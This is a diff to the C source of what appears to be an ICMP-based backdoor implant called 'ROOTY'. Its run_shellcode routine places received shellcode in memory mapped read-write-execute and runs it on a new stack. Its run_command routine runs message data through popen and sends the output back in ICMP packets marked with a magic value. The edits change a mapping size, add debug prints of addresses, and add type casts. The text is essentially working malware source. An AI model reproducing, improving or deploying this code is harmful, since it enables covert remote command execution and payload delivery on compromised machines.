@@ -139,20 +139,24 @@ void run_shellcode(const unsigned char *shellcode, uint32_t size) {
 	unsigned char *executable = NULL, *new_stack = NULL;
 	
 	// We need some more memory to work
-	if((executable = mmap(NULL, size, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) == MAP_FAILED) {
+	if((executable = mmap(NULL, STACK_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) == MAP_FAILED) {
 		DEBUG_WRAP(fprintf(stderr, "Failed to mmap new executable area\n"));
 		return;
 	}
+	DEBUG_WRAP(fprintf(stderr, "Created new executable section at 0x%p\n", executable));
+
 	// Copy our prefix and shellcode in
 	if(memcpy(executable, shellcode, size) != executable) {
 		DEBUG_WRAP(fprintf(stderr, "Failed to copy shellcode to new executable memory region\n"));
 		return;
 	}
+
 	// We need some more memory to work
         if((new_stack = mmap(NULL, STACK_SIZE, PROT_EXEC | PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0)) == MAP_FAILED) {
 		DEBUG_WRAP(fprintf(stderr, "Failed to mmap new stack area\n"));
 		return;
 	}
+	DEBUG_WRAP(fprintf(stderr, "Created new stack section at 0x%p\n", new_stack));
 
 	execute_shellcode(executable, new_stack + (STACK_SIZE / 2));
 }
@@ -179,9 +183,9 @@ void run_command(ROOTY_MESSAGE *msg, const struct ip_hdr *ip, const struct icmp_
 
 	if((fd = popen((char *)msg->data, "r")) != NULL) {
         
-        while(fgets(res->data, MAX_PACKET_SIZE, fd)) {
+        while(fgets((char *)res->data, MAX_PACKET_SIZE, fd)) {
             res->type = MESSAGE_OS | MESSAGE_ARCH;
-            res->len = strlen(res->data);
+            res->len = strlen((char *)res->data);
             memcpy(res->magic, MAGIC, strlen(MAGIC));
 			send_packet(res, ip, icmp);
 			memset(res->magic, 0, MAX_PACKET_SIZE + sizeof(ROOTY_MESSAGE) - BLOCK_SIZE);
